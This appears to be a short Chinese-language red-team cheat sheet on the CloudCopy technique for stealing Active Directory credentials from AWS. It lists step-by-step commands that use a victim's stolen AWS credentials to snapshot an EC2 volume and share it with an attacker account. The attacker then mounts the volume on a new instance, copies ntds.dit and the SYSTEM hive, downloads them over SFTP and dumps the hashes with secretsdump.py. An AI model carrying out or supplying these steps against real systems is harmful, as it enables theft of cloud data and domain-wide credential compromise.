	条件：
	EC2：创建快照
	CloudCopy - https://github.com/Static-Flow/CloudCopy

	使用至少具有 CreateSnapshot 权限的受害者凭证加载 AWS CLI
	运行"Describe-Instances"并显示在列表中供攻击者选择
	"Create-Snapshot"在选定实例的卷上运行
	"modify-snapshot-attribute"在新快照上运行以设置"createVolumePermission"为攻击者 AWS 账户
	使用攻击者凭证加载 AWS CLI
	运行"run-instance"命令用我们偷来的快照创建新的 linux ec2
	SSH 运行"sudo mkdir /windows"
	SSH 运行"sudo mount /dev/xvdf1 /windows/"
	SSH 运行"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user"
	SSH 运行"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user"
	SSH 运行"sudo chown ec2-user:ec2-user /home/ec2-user/*"
	SFTP 获取"/home/ec2-user/SYSTEM ./SYSTEM"
	SFTP 获取"/home/ec2-user/ntds.dit ./ntds.dit"
	本地运行"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'，期望 secretsdump 在路径上